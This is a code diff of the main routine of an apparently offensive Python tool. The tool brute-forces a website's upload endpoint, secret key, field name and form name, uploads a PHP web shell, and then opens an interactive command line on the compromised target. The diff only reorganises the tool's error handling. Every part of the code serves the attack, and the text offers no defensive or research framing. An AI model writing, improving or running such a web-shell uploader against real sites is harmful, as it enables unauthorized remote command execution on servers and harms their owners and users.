@@ -55,72 +55,71 @@ def main():
 
     Logger.success('target is online')
 
-    try:
-        url = args.url
-        field_name = args.field_name
-        secret = args.secret
-        form_name = args.form_name
+    url = args.url
+    field_name = args.field_name
+    secret = args.secret
+    form_name = args.form_name
 
-        cache_data = Cache.get(url) if args.cache_enabled else None
+    cache_data = Cache.get(url) if args.cache_enabled else None
 
-        if cache_data is None:
-            if args.brute_endpoint:
-                if args.verbose:
-                    Logger.info('brute forcing endpoint...')
-
-                url = Brute.endpoint(url)
-
-                if url is None:
-                    Logger.error('endpoint not found')
-
-                Logger.success(f'endpoint found: \x1b[95m{url}')
-
-            if Brute.is_required(url):  # checks if it's necessary to brute force field name and secret key
-                if args.brute_field:
-                    if args.verbose:
-                        Logger.info('brute forcing secret key field name...')
-
-                    field_name = Brute.field_name(url)
-
-                    if field_name is None:
-                        Logger.error('field name not found')
-
-                    Logger.success(f'field name found: \x1b[95m{field_name}')
-
-                if args.brute_secret:
-                    if args.verbose:
-                        Logger.info('brute forcing secret key...')
-
-                    secret = Brute.secret(url, field_name)
-
-                    if secret is None:
-                        Logger.error('secret not found')
-
-                    Logger.success(f'secret found: \x1b[95m{secret}')
-
-            if args.brute_form:
-                if args.verbose:
-                    Logger.info('brute forcing multipart form name...')
-
-                form_name = Brute.form_name(url, secret, field_name)
-
-                if form_name is None:
-                    Logger.error('form name not found')
-
-                Logger.success(f'form name found: \x1b[95m{form_name}')
-
+    if cache_data is None:
+        if args.brute_endpoint:
             if args.verbose:
-                Logger.info('attempting to upload php web shell...')
+                Logger.info('brute forcing endpoint...')
 
+            url = Brute.endpoint(url)
+
+            if url is None:
+                Logger.error('endpoint not found')
+
+            Logger.success(f'endpoint found: \x1b[95m{url}')
+
+        if Brute.is_required(url):  # checks if it's necessary to brute force secret key POST data field name and secret key
+            if args.brute_field:
+                if args.verbose:
+                    Logger.info('brute forcing secret key field name...')
+
+                field_name = Brute.field_name(url)
+
+                if field_name is None:
+                    Logger.error('field name not found')
+
+                Logger.success(f'field name found: \x1b[95m{field_name}')
+
+            if args.brute_secret:
+                if args.verbose:
+                    Logger.info('brute forcing secret key...')
+
+                secret = Brute.secret(url, field_name)
+
+                if secret is None:
+                    Logger.error('secret not found')
+
+                Logger.success(f'secret found: \x1b[95m{secret}')
+
+        if args.brute_form:
+            if args.verbose:
+                Logger.info('brute forcing multipart form name...')
+
+            form_name = Brute.form_name(url, secret, field_name)
+
+            if form_name is None:
+                Logger.error('form name not found')
+
+            Logger.success(f'form name found: \x1b[95m{form_name}')
+
+        if args.verbose:
+            Logger.info('attempting to upload php web shell...')
+
+        try:
             shell_url = Exploit.upload_shell(url, form_name, secret, field_name, args.verbose, args.cache_enabled)  # program will exit if an error occurs (shell_url cannot be None)
-        else:
-            Logger.info('shell url fetched from cache')
-            shell_url = cache_data['shell_url']
+        except Exception:
+            Logger.error(f'an error occurred while attempting to upload php web shell on target site')
+    else:
+        Logger.info('shell url fetched from cache')
+        shell_url = cache_data['shell_url']
 
-        Shell.command_line(shell_url)
-
-    except Exception as e:
-        Logger.error(f'an error occurred while attempting to upload shell to target: \x1b[95m{e}')
+    Shell.command_line(shell_url)
 
 
 if __name__ == '__main__':
